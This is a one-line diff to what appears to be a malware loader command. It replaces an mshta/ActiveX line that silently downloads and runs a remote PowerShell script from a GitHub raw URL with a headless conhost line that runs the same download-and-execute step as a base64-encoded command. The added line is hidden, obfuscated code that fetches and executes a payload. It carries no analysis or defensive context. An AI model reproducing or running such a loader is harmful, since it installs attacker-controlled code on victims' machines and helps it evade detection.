@@ -1,1 +1,1 @@
-mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -w 1 -ep bypass -c iex(irm \'https://raw.githubusercontent.com/serafipka/idkakkwa/refs/heads/main/pidor.ps1\')', 0, false);window.close();"
+conhost.exe --headless powershell -nop -ep bypass -enc aQBlAHgAIAAoAGkAcgBtACAAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAHMAZQByAGEAZgBpAHAAawBhAC8AaQBkAGsAYQBrAGsAdwBhAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBwAGkAZABvAHIALgBwAHMAMQAnACkA
